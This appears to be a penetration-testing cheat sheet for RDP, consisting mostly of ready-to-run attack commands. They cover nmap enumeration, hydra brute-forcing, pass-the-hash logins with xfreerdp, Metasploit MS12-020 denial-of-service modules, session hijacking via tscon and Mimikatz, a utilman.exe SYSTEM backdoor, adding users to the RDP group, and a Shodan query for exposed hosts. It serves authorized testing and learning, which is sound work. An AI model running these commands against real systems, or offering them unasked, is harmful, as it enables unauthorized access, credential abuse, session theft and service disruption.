# RDP Pentesting Checklist & Commands

## üéØ What am I realistically expecting to find here?

‚≠ê After enumerating RDP (port 3389), I realistically expect to find:

- [ ] Open access with weak/default credentials
- [ ] NTLM hashes for pass-the-hash attacks
- [ ] Encryption level details for downgrade or MITM attacks
- [ ] Vulnerabilities (e.g., MS12-020 DoS/Exploit)
- [ ] Misconfigurations like admin sessions left open
- [ ] Ability to steal or hijack active sessions
- [ ] Post-exploitation: lateral movement or persistence

---

## ‚úÖ RDP Pentest Checklist

- [ ] **Port Scan & Service Detection**
  - Confirm service, banner, and encryption.
    ```
    nmap -Pn -sV -p3389 <IP>
    nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 <IP>
    ```

- [ ] **Basic RDP Client Connection (Creds/Hash)**
  - Using password:
    ```
    rdesktop -u <username> <IP>
    rdesktop -d <domain> -u <username> -p <password> <IP>
    xfreerdp /u:<username> /p:<password> /v:<IP>
    ```
  - Using NTLM hash:
    ```
    xfreerdp /u:<username> /pth:<hash> /v:<IP>
    xfreerdp /v:10.129.234.51 /dynamic-resolution +clipboard -sec-nla
    ```

- [ ] **Brute-Forcing**
  - **‚ö†Ô∏è Risk: May lock accounts!**
    ```
    hydra -t 4 -V -f -l <username> -P passwords.txt rdp://<IP>
    ```

- [ ] **Check Known Credentials (Impacket)**
    ```
    rdp_check <domain>/<username>:<password>@<IP>
    ```

---

## ‚úÖ Metasploit Modules

- [ ] Enumeration:
    ```
    use auxiliary/scanner/rdp/rdp_scanner
    use auxiliary/scanner/rdp/rdp_enum
    use auxiliary/scanner/rdp/rdp_version
    ```

- [ ] Exploits:
    ```
    use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
    use auxiliary/dos/windows/rdp/ms12_020_check
    ```

---

## ‚úÖ Post-Exploitation

- [ ] **Add User to RDP Group**
    ```powershell
    net localgroup "Remote Desktop Users" <UserLoginName> /add
    ```

- [ ] **Stealing/Riding Sessions with Built-in Tools**
  - **List open sessions:**
    ```
    query user
    ```
  - **Steal session (Admin):**
    ```
    tscon <SESSION_ID> /dest:<SESSION_NAME>
    ```

- [ ] **Run Command as Another User (NetOnly)**
  - Use alternate credentials for network interactions:
    ```
    runas /netonly /user:<DOMAIN>\<USERNAME> "cmd.exe"
    ```

---

## ‚úÖ Advanced Session Hijacking with Mimikatz

- **List Terminal Services Sessions**
    ```
    ts::sessions
    ```
- **Connect to a Session**
    ```
    ts::remote /id:<SESSION_ID>
    ```

---

## ‚úÖ Sticky-Keys & Utilman Backdoor

- **Technique**: Replace utilman.exe with cmd.exe for SYSTEM-level console at RDP login screen.
- **Detection & Cleanup**:
    - Check for replaced binaries.
    - Tool: [Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

---

## ‚úÖ Recommended Tool: AutoRDPwn

- Automated post-exploitation for RDP sessions.
    - Repo: [AutoRDPwn](https://github.com/JoelGMSec/AutoRDPwn)

---

## ‚úÖ Shodan Dork

- [ ] Find open RDP instances on the Internet.
    ```
    port:3389
    ```

---

## ‚úÖ Resources

- üìö [HackTricks: Pentesting RDP](https://book.hacktricks.xyz/pentesting/pentesting-rdp)
